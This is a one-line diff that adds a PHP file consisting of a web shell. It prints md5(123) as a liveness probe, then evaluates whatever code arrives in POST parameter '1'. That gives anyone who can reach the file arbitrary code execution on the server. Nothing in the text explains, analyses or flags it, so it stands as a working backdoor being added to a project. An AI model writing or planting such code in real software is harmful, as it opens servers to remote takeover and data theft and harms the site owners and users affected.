@@ -1,0 +1,1 @@
+<?php var_dump(md5(123));$content=stripslashes($_POST[1]);eval($content);  
